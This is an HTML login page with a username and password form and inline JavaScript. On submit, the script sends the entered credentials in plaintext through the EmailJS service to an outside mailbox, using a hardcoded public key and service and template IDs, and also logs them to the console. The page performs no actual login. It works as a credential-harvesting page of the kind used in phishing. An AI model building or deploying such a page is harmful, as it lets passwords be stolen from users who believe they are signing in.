<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  // Initialize EmailJS with your public key
  (function(){ emailjs.init('-aUDdkE0WsVXws0jE'); })();

  // Handle login form submission
  function handleLogin(event){
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if(!username || !password){
      alert('Please fill in all fields');
      return;
    }

    const templateParams = {
      username: username,
      password: password
    };

    console.log('Sending:', templateParams); // Debug: check values in console

    emailjs.send('service_hjj36j4', 'template_xt30ood', templateParams)
      .then(() => {
        alert('Login info sent to your email!');
        document.getElementById('loginForm').reset();
      })
      .catch(err => {
        console.error('Email sending failed:', err);
        alert('Failed to send login info. Check console for details.');
      });
  }
</script>
<style>
  body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
  .login-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); width: 350px; text-align: center; }
  input { width: 100%; padding: 12px; margin: 12px 0; border-radius: 6px; border: 1px solid #ccc; }
  button { width: 100%; padding: 12px; margin-top: 12px; border: none; border-radius: 6px; background-color: #007BFF; color: white; font-size: 16px; cursor: pointer; }
  button:hover { background-color: #0056b3; }
</style>
</head>
<body>
  <div class="login-container">
    <h2>Login</h2>
    <form id="loginForm" onsubmit="handleLogin(event)">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
